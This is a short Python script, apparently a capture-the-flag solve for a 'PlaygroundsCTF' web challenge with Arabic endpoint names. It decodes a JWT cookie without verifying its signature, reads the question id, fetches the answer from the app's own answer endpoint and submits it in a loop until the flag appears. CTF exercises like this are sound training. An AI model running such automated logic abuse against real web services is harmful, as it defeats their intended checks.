import requests
import jwt

s = requests.Session()
base_url = ""
i = 0

while True:
    r = s.get(f"{base_url}/سؤال")
    token = jwt.decode(r.cookies["token"], options={"verify_signature": False})
    qid = token["المعرف"]
    i = token['العداد']
    print(i)

    r = s.get(f"{base_url}/جواب", params={'المعرف': qid})
    answer = r.text

    r = s.post(f"{base_url}/تحقق", data={'الاجابة': answer})

    if "PlaygroundsCTF{" in r.text:
        print(r.text)
        break
